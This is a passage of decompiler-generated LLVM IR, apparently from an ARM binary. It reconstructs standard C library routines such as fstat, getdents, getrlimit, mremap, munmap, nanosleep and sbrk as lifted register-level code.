  %v0_161ac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_161ac, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_161ac, -4095
  br i1 %tmp, label %dec_label_pc_161d4, label %dec_label_pc_161bc

dec_label_pc_161bc:                               ; preds = %entry
  %v0_161c0 = call i32 @__aeabi_read_tp()
  %v3_161c4 = load i16, i16* @global_var_23068.362, align 2
  %v4_161c4 = sext i16 %v3_161c4 to i32
  %v0_161c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_161c8 = sub i32 0, %v0_161c8
  store i32 %v1_161c8, i32* %r2.global-to-local, align 4
  %v3_161cc = add i32 %v4_161c4, %v0_161c0
  %v4_161cc = inttoptr i32 %v3_161cc to i32*
  store i32 %v1_161c8, i32* %v4_161cc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_161d4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_161d4

dec_label_pc_161d4:                               ; preds = %entry, %dec_label_pc_161bc
  %v1_161d8 = phi i32 [ %v0_161ac, %entry ], [ -1, %dec_label_pc_161bc ]
  %v2_161d4 = phi i32 [ %v3_161a0, %entry ], [ %v2_161d4.pre, %dec_label_pc_161bc ]
  store i32 %v2_161d4, i32* @r7, align 4
  ret i32 %v1_161d8

; uselistorder directives
  uselistorder i32 %v0_161ac, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_161d4, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_161ec

dec_label_pc_161ec:                               ; preds = %dec_label_pc_16218, %dec_label_pc_1622c, %entry
  %v0_161ec = phi i32 [ %arg1, %entry ], [ %v0_161ec.pre.pre, %dec_label_pc_1622c ], [ %v0_16218, %dec_label_pc_16218 ]
  store i32 %v0_161ec, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_161ec, -4095
  br i1 %tmp, label %dec_label_pc_16218, label %dec_label_pc_16208

dec_label_pc_16208:                               ; preds = %dec_label_pc_161ec
  %v0_16208 = call i32 @__aeabi_read_tp()
  %v0_1620c = load i32, i32* %r2.global-to-local, align 4
  %v1_1620c = sub i32 0, %v0_1620c
  store i32 %v1_1620c, i32* %r2.global-to-local, align 4
  %v3_16210 = load i16, i16* @global_var_23068.362, align 2
  %v4_16210 = sext i16 %v3_16210 to i32
  %v3_16214 = add i32 %v4_16210, %v0_16208
  %v4_16214 = inttoptr i32 %v3_16214 to i32*
  store i32 %v1_1620c, i32* %v4_16214, align 4
  %v0_16218.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16218

dec_label_pc_16218:                               ; preds = %dec_label_pc_161ec, %dec_label_pc_16208
  %v0_16218 = phi i32 [ %v0_161ec, %dec_label_pc_161ec ], [ %v0_16218.pre, %dec_label_pc_16208 ]
  store i32 %v0_16218, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_16218, -4095
  br i1 %tmp4, label %dec_label_pc_161ec, label %dec_label_pc_1622c

dec_label_pc_1622c:                               ; preds = %dec_label_pc_16218
  %v0_1622c = call i32 @__aeabi_read_tp()
  %v0_16230 = load i32, i32* %r2.global-to-local, align 4
  %v1_16230 = sub i32 0, %v0_16230
  store i32 %v1_16230, i32* %r2.global-to-local, align 4
  %v3_16234 = load i16, i16* @global_var_23068.362, align 2
  %v4_16234 = sext i16 %v3_16234 to i32
  %v3_16238 = add i32 %v4_16234, %v0_1622c
  %v4_16238 = inttoptr i32 %v3_16238 to i32*
  store i32 %v1_16230, i32* %v4_16238, align 4
  %v0_161ec.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_161ec

; uselistorder directives
  uselistorder i32 %v0_16218, { 0, 2, 1 }
  uselistorder i32 %v0_161ec, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16218, { 1, 0 }
  uselistorder label %dec_label_pc_161ec, { 1, 0, 2 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_16250 = load i32, i32* @r1, align 4
  store i32 %v0_16250, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_16260 = load i32, i32* @r0, align 4
  store i32 %v0_16260, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_16260, -4095
  br i1 %tmp, label %dec_label_pc_16288, label %dec_label_pc_1626c

dec_label_pc_1626c:                               ; preds = %entry
  %v0_16270 = call i32 @__aeabi_read_tp()
  %v3_16274 = load i16, i16* @global_var_23068.362, align 2
  %v4_16274 = sext i16 %v3_16274 to i32
  store i32 %v4_16274, i32* @r3, align 4
  %v0_16278 = load i32, i32* @r2, align 4
  %v1_16278 = sub i32 0, %v0_16278
  store i32 %v1_16278, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_16280 = add i32 %v4_16274, %v0_16270
  %v4_16280 = inttoptr i32 %v3_16280 to i32*
  store i32 %v1_16278, i32* %v4_16280, align 4
  br label %dec_label_pc_16298

dec_label_pc_16288:                               ; preds = %entry
  store i32 %v0_16260, i32* %r7.global-to-local, align 4
  %v2_16288 = icmp eq i32 %v0_16260, 0
  br i1 %v2_16288, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16288
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16288, %bb
  call void @__pseudo_cond_branch(i1 %v2_16288, i32 ptrtoint (i32* @global_var_166d8.597 to i32))
  br label %dec_label_pc_16298

dec_label_pc_16298:                               ; preds = %dec_label_pc_1626c, %.thread
  %v0_16298 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_16298

; uselistorder directives
  uselistorder i32 %v0_16260, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 197, { 1, 0 }
  uselistorder label %dec_label_pc_16298, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__getdents(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_162ac = load i32, i32* @r5, align 4
  %v18_162ac = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_162e4, label %dec_label_pc_162c8

dec_label_pc_162c8:                               ; preds = %entry
  %v1_162cc = sub i32 0, %arg1
  %v3_162d0 = load i16, i16* @global_var_23068.362, align 2
  %v4_162d0 = sext i16 %v3_162d0 to i32
  store i32 %v4_162d0, i32* %r3.global-to-local, align 4
  %v0_162d4 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* @r5, align 4
  %v3_162dc = add i32 %v4_162d0, %v0_162d4
  %v4_162dc = inttoptr i32 %v3_162dc to i32*
  store i32 %v1_162cc, i32* %v4_162dc, align 4
  br label %dec_label_pc_16338

dec_label_pc_162e4:                               ; preds = %entry
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_162e4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_162ec = add i32 %arg2, %arg1
  store i32 %v3_162ec, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_162e4, %bb
  %v1_163284 = phi i32 [ %v18_162ac, %dec_label_pc_162e4 ], [ %v3_162ec, %bb ]
  %v0_163242 = phi i32 [ 141, %dec_label_pc_162e4 ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_16338, label %dec_label_pc_16324

dec_label_pc_162f8:                               ; preds = %dec_label_pc_16324
  %v1_1632c = inttoptr i32 %v1_16324 to i8*
  %v1_162f8 = add i32 %v0_162f8, 8
  %v2_162f8 = inttoptr i32 %v1_162f8 to i16*
  %v3_162f8 = load i16, i16* %v2_162f8, align 2
  %v4_162f8 = zext i16 %v3_162f8 to i32
  %v2_162fc = add i32 %v4_162f8, %v0_162f8
  store i32 %v2_162fc, i32* @r3, align 4
  %v1_16300 = add i32 %v2_162fc, -1
  %v2_16300 = inttoptr i32 %v1_16300 to i8*
  %v3_16300 = load i8, i8* %v2_16300, align 1
  %v4_16300 = zext i8 %v3_16300 to i32
  store i32 %v4_16300, i32* @r4, align 4
  %v3_16304 = call i32 @strlen(i8* %v1_1632c)
  %v0_16308 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_16308, i32* @r1, align 4
  %v1_1630c = add i32 %v3_16304, 1
  store i32 %v1_1630c, i32* @r2, align 4
  %v0_16310 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_16310, i32* @r0, align 4
  %v3_16314 = call i32 @memmove(i32 %v0_16310, i32 %v0_16308, i32 %v1_1630c)
  %v0_16318 = load i32, i32* %r7.global-to-local, align 4
  %v1_16318 = add i32 %v0_16318, 8
  %v2_16318 = inttoptr i32 %v1_16318 to i16*
  %v3_16318 = load i16, i16* %v2_16318, align 2
  %v4_16318 = zext i16 %v3_16318 to i32
  store i32 %v4_16318, i32* %r3.global-to-local, align 4
  %v0_1631c = load i32, i32* @r4, align 4
  %v1_1631c = trunc i32 %v0_1631c to i8
  %v3_1631c = add i32 %v0_16318, 10
  %v4_1631c = inttoptr i32 %v3_1631c to i8*
  store i8 %v1_1631c, i8* %v4_1631c, align 1
  %v0_16320 = load i32, i32* %r7.global-to-local, align 4
  %v1_16320 = load i32, i32* %r3.global-to-local, align 4
  %v2_16320 = add i32 %v1_16320, %v0_16320
  store i32 %v2_16320, i32* %r7.global-to-local, align 4
  %v1_16328.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_16324

dec_label_pc_16324:                               ; preds = %.thread, %dec_label_pc_162f8
  %v1_16328 = phi i32 [ %v1_16328.pre, %dec_label_pc_162f8 ], [ %v1_163284, %.thread ]
  %v0_162f8 = phi i32 [ %v2_16320, %dec_label_pc_162f8 ], [ %v0_163242, %.thread ]
  %v1_16324 = add i32 %v0_162f8, 10
  store i32 %v1_16324, i32* %r6.global-to-local, align 4
  %v3_16328 = icmp ult i32 %v0_162f8, %v1_16328
  %v1_16330 = add i32 %v0_162f8, 11
  store i32 %v1_16330, i32* %r8.global-to-local, align 4
  br i1 %v3_16328, label %dec_label_pc_162f8, label %dec_label_pc_16338

dec_label_pc_16338:                               ; preds = %dec_label_pc_16324, %.thread, %dec_label_pc_162c8
  %v0_16338 = load i32, i32* @r5, align 4
  store i32 %v6_162ac, i32* @r5, align 4
  store i32 %v18_162ac, i32* @sl, align 4
  ret i32 %v0_16338

; uselistorder directives
  uselistorder i32 %v1_16324, { 1, 0 }
  uselistorder i32 %v0_162f8, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_162ac, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 141, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_16324, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_16350 = ptrtoint i32* %stack_var_-16 to i32
  %v2_1635c = call i32 @getrlimit(i32 7, i32 %v2_16350)
  %v1_16360 = icmp slt i32 %v2_1635c, 0
  %v5_16364 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_16360, i32 256, i32 %v5_16364
  ret i32 %storemerge
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_16388 = load i32, i32* @r0, align 4
  ret i32 %v1_16388
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_1639c = load i32, i32* @r0, align 4
  ret i32 %v1_1639c
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_163b0 = load i32, i32* @r0, align 4
  ret i32 %v1_163b0
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_163c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 148) to i32*), align 4
  %v1_163c4 = inttoptr i32 %v4_163c0 to i32*
  %v2_163c4 = load i32, i32* %v1_163c4, align 4
  %v2_163c8 = icmp eq i32 %v2_163c4, 0
  br i1 %v2_163c8, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_163d0 = phi i32 [ %v2_163c4, %entry ], [ 4096, %bb ]
  ret i32 %v1_163d0

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_16408, label %dec_label_pc_163f0

dec_label_pc_163f0:                               ; preds = %entry
  %v1_163f4 = sub i32 0, %arg1
  %v3_163f8 = load i16, i16* @global_var_23068.362, align 2
  %v4_163f8 = sext i16 %v3_163f8 to i32
  %v0_163fc = call i32 @__aeabi_read_tp()
  %v3_16400 = add i32 %v4_163f8, %v0_163fc
  %v4_16400 = inttoptr i32 %v3_16400 to i32*
  store i32 %v1_163f4, i32* %v4_16400, align 4
  br label %dec_label_pc_16408

dec_label_pc_16408:                               ; preds = %entry, %dec_label_pc_163f0
  %v1_1640c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_163f0 ]
  ret i32 %v1_1640c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16408, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16414 = load i32, i32* @r7, align 4
  store i32 %v3_16414, i32* %stack_var_-8, align 4
  %v0_16420 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16420, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16420, -4095
  br i1 %tmp, label %dec_label_pc_16448, label %dec_label_pc_16430

dec_label_pc_16430:                               ; preds = %entry
  %v0_16434 = call i32 @__aeabi_read_tp()
  %v3_16438 = load i16, i16* @global_var_23068.362, align 2
  %v4_16438 = sext i16 %v3_16438 to i32
  store i32 %v4_16438, i32* @r3, align 4
  %v0_1643c = load i32, i32* %r2.global-to-local, align 4
  %v1_1643c = sub i32 0, %v0_1643c
  store i32 %v1_1643c, i32* %r2.global-to-local, align 4
  %v3_16440 = add i32 %v4_16438, %v0_16434
  %v4_16440 = inttoptr i32 %v3_16440 to i32*
  store i32 %v1_1643c, i32* %v4_16440, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_16448.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16448

dec_label_pc_16448:                               ; preds = %entry, %dec_label_pc_16430
  %v1_1644c = phi i32 [ %v0_16420, %entry ], [ -1, %dec_label_pc_16430 ]
  %v2_16448 = phi i32 [ %v3_16414, %entry ], [ %v2_16448.pre, %dec_label_pc_16430 ]
  store i32 %v2_16448, i32* @r7, align 4
  ret i32 %v1_1644c

; uselistorder directives
  uselistorder i32 %v0_16420, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16448, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_16464 = load i32, i32* @r0, align 4
  ret i32 %v1_16464
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_16468 = load i32, i32* @r4, align 4
  store i32 %v3_16468, i32* %stack_var_-12, align 4
  %v0_16478 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16478, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16478, -4095
  br i1 %tmp, label %dec_label_pc_164a0, label %dec_label_pc_16488

dec_label_pc_16488:                               ; preds = %entry
  %v0_1648c = call i32 @__aeabi_read_tp()
  %v3_16490 = load i16, i16* @global_var_23068.362, align 2
  %v4_16490 = sext i16 %v3_16490 to i32
  %v0_16494 = load i32, i32* %r2.global-to-local, align 4
  %v1_16494 = sub i32 0, %v0_16494
  store i32 %v1_16494, i32* %r2.global-to-local, align 4
  %v3_16498 = add i32 %v4_16490, %v0_1648c
  %v4_16498 = inttoptr i32 %v3_16498 to i32*
  store i32 %v1_16494, i32* %v4_16498, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_164a0.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_164a0

dec_label_pc_164a0:                               ; preds = %entry, %dec_label_pc_16488
  %v1_164a4 = phi i32 [ %v0_16478, %entry ], [ -1, %dec_label_pc_16488 ]
  %v2_164a0 = phi i32 [ %v3_16468, %entry ], [ %v2_164a0.pre, %dec_label_pc_16488 ]
  store i32 %v2_164a0, i32* @r4, align 4
  ret i32 %v1_164a4

; uselistorder directives
  uselistorder i32 %v0_16478, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_164a0, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_164ac = load i32, i32* @r7, align 4
  store i32 %v3_164ac, i32* %stack_var_-8, align 4
  %v0_164b8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_164b8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_164b8, -4095
  br i1 %tmp, label %dec_label_pc_164e0, label %dec_label_pc_164c8

dec_label_pc_164c8:                               ; preds = %entry
  %v0_164cc = call i32 @__aeabi_read_tp()
  %v3_164d0 = load i16, i16* @global_var_23068.362, align 2
  %v4_164d0 = sext i16 %v3_164d0 to i32
  %v0_164d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_164d4 = sub i32 0, %v0_164d4
  store i32 %v1_164d4, i32* %r2.global-to-local, align 4
  %v3_164d8 = add i32 %v4_164d0, %v0_164cc
  %v4_164d8 = inttoptr i32 %v3_164d8 to i32*
  store i32 %v1_164d4, i32* %v4_164d8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_164e0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_164e0

dec_label_pc_164e0:                               ; preds = %entry, %dec_label_pc_164c8
  %v1_164e4 = phi i32 [ %v0_164b8, %entry ], [ -1, %dec_label_pc_164c8 ]
  %v2_164e0 = phi i32 [ %v3_164ac, %entry ], [ %v2_164e0.pre, %dec_label_pc_164c8 ]
  store i32 %v2_164e0, i32* @r7, align 4
  ret i32 %v1_164e4

; uselistorder directives
  uselistorder i32 %v0_164b8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_164e0, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_164ec = load i32, i32* @r7, align 4
  store i32 %v3_164ec, i32* %stack_var_-8, align 4
  %v0_164f8 = load i32, i32* @r0, align 4
  store i32 %v0_164f8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_164f8, -4095
  br i1 %tmp, label %dec_label_pc_16520, label %dec_label_pc_16508

dec_label_pc_16508:                               ; preds = %entry
  %v0_1650c = call i32 @__aeabi_read_tp()
  %v3_16510 = load i16, i16* @global_var_23068.362, align 2
  %v4_16510 = sext i16 %v3_16510 to i32
  %v0_16514 = load i32, i32* %r2.global-to-local, align 4
  %v1_16514 = sub i32 0, %v0_16514
  store i32 %v1_16514, i32* %r2.global-to-local, align 4
  %v3_16518 = add i32 %v4_16510, %v0_1650c
  %v4_16518 = inttoptr i32 %v3_16518 to i32*
  store i32 %v1_16514, i32* %v4_16518, align 4
  %v2_16520.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16520

dec_label_pc_16520:                               ; preds = %entry, %dec_label_pc_16508
  %v1_16524 = phi i32 [ %v0_164f8, %entry ], [ -1, %dec_label_pc_16508 ]
  %v2_16520 = phi i32 [ %v3_164ec, %entry ], [ %v2_16520.pre, %dec_label_pc_16508 ]
  store i32 %v2_16520, i32* @r7, align 4
  ret i32 %v1_16524

; uselistorder directives
  uselistorder i32 %v0_164f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16520, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_16538 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 12772) to i32*), align 4
  %v2_1653c = icmp eq i32 %v4_16538, 0
  %v3_16540 = load i32, i32* @r4, align 4
  %v9_16540 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_1653c, label %dec_label_pc_16550, label %entry.dec_label_pc_16558_crit_edge

entry.dec_label_pc_16558_crit_edge:               ; preds = %entry
  br label %dec_label_pc_16558

dec_label_pc_16550:                               ; preds = %entry
  store i32 %v3_16540, i32* @r4, align 4
  store i32 %v9_16540, i32* @r6, align 4
  %v0_16554 = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_16558

dec_label_pc_16558:                               ; preds = %entry.dec_label_pc_16558_crit_edge, %dec_label_pc_16550
  %v0_16558 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_16558, i32* @r5, align 4
  %v0_16564 = load i32, i32* @r4, align 4
  store i32 %v0_16564, i32* @r0, align 4
  %v0_16568 = call i32 @__syscall_nanosleep()
  store i32 %v0_16568, i32* @r4, align 4
  %v0_16570 = load i32, i32* @r5, align 4
  %v1_16574 = call i32 @__libc_disable_asynccancel(i32 %v0_16570)
  %v0_16578 = load i32, i32* @r4, align 4
  ret i32 %v0_16578

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 2, 7, 12, 1, 6, 5, 4, 8, 11, 3, 10, 9, 0 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 2, 7, 12, 1, 6, 5, 4, 8, 11, 3, 10, 9, 0 }
  uselistorder label %dec_label_pc_16558, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1658c = load i32, i32* @r4, align 4
  store i32 %v3_1658c, i32* %stack_var_-16, align 4
  store i32 11572, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r4.global-to-local, align 4
  %v4_1659c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 11572) to i32*), align 4
  %v2_165a0 = icmp eq i32 %v4_1659c, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_165a0, label %dec_label_pc_165ac, label %dec_label_pc_165bc

dec_label_pc_165ac:                               ; preds = %entry
  %v1_165b0 = call i32 @__GI_brk(i32 0)
  %v1_165b4 = icmp slt i32 %v1_165b0, 0
  br i1 %v1_165b4, label %dec_label_pc_165e0, label %dec_label_pc_165bcthread-pre-split

dec_label_pc_165bcthread-pre-split:               ; preds = %dec_label_pc_165ac
  %v0_165c0.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_165bc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_165bc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_165bc

dec_label_pc_165bc:                               ; preds = %dec_label_pc_165bcthread-pre-split, %entry
  %v1_165bc = phi i32 [ %v1_165bc.pre, %dec_label_pc_165bcthread-pre-split ], [ 11572, %entry ]
  %v0_165bc = phi i32 [ %v0_165bc.pre, %dec_label_pc_165bcthread-pre-split ], [ ptrtoint (i32* @global_var_23010.366 to i32), %entry ]
  %v1_165d0 = phi i32 [ %v0_165c0.pr, %dec_label_pc_165bcthread-pre-split ], [ %arg1, %entry ]
  %v2_165bc = add i32 %v0_165bc, %v1_165bc
  %v3_165bc = inttoptr i32 %v2_165bc to i32*
  %v4_165bc = load i32, i32* %v3_165bc, align 4
  %v2_165c0 = icmp eq i32 %v1_165d0, 0
  store i32 %v4_165bc, i32* %r4.global-to-local, align 4
  br i1 %v2_165c0, label %dec_label_pc_165e4, label %dec_label_pc_165cc

dec_label_pc_165cc:                               ; preds = %dec_label_pc_165bc
  %v2_165d0 = add i32 %v4_165bc, %v1_165d0
  %v1_165d4 = call i32 @__GI_brk(i32 %v2_165d0)
  %v1_165d8 = icmp slt i32 %v1_165d4, 0
  br i1 %v1_165d8, label %dec_label_pc_165e0, label %dec_label_pc_165cc.dec_label_pc_165e4_crit_edge

dec_label_pc_165cc.dec_label_pc_165e4_crit_edge:  ; preds = %dec_label_pc_165cc
  %v0_165e4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_165e4

dec_label_pc_165e0:                               ; preds = %dec_label_pc_165cc, %dec_label_pc_165ac
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_165e4

dec_label_pc_165e4:                               ; preds = %dec_label_pc_165bc, %dec_label_pc_165cc.dec_label_pc_165e4_crit_edge, %dec_label_pc_165e0
  %v0_165e4 = phi i32 [ %v0_165e4.pre, %dec_label_pc_165cc.dec_label_pc_165e4_crit_edge ], [ -1, %dec_label_pc_165e0 ], [ %v4_165bc, %dec_label_pc_165bc ]
  %v2_165e8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_165e8, i32* @r4, align 4
  ret i32 %v0_165e4

; uselistorder directives
  uselistorder i32 %v4_165bc, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_165e4, { 2, 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_16608 = load i32, i32* @r0, align 4
  ret i32 %v1_16608
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1660c = load i32, i32* @r4, align 4
  store i32 %v3_1660c, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_16624 = inttoptr i32 %arg2 to i8*
  %v4_16624 = call i32 @__GI_memset(i8* %v3_16624, i32 0, i32 104)
  %v2_16628 = load i32, i32* %arg1, align 4
  store i32 %v2_16628, i32* %r3.global-to-local, align 4
  %v3_16628 = add i32 %tmp, 4
  %v4_16628 = inttoptr i32 %v3_16628 to i32*
  %v5_16628 = load i32, i32* %v4_16628, align 4
  store i32 %v5_16628, i32* %r4.global-to-local, align 4
  %v0_1662c = load i32, i32* %r5.global-to-local, align 4
  %v1_1662c = inttoptr i32 %v0_1662c to i32*
  store i32 %v2_16628, i32* %v1_1662c, align 4
  %v3_1662c = add i32 %v0_1662c, 4
  %v4_1662c = inttoptr i32 %v3_1662c to i32*
  %v5_1662c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1662c, i32* %v4_1662c, align 4
  %v0_16630 = load i32, i32* %r6.global-to-local, align 4
  %v1_16630 = add i32 %v0_16630, 12
  %v2_16630 = inttoptr i32 %v1_16630 to i32*
  %v3_16630 = load i32, i32* %v2_16630, align 4
  %v1_16634 = load i32, i32* %r5.global-to-local, align 4
  %v2_16634 = add i32 %v1_16634, 12
  %v3_16634 = inttoptr i32 %v2_16634 to i32*
  store i32 %v3_16630, i32* %v3_16634, align 4
  %v0_16638 = load i32, i32* %r6.global-to-local, align 4
  %v1_16638 = add i32 %v0_16638, 96
  store i32 %v1_16638, i32* %r3.global-to-local, align 4
  %v1_1663c = inttoptr i32 %v1_16638 to i32*
  %v2_1663c = load i32, i32* %v1_1663c, align 4
  store i32 %v2_1663c, i32* %r3.global-to-local, align 4
  %v3_1663c = add i32 %v0_16638, 100
  %v4_1663c = inttoptr i32 %v3_1663c to i32*
  %v5_1663c = load i32, i32* %v4_1663c, align 4
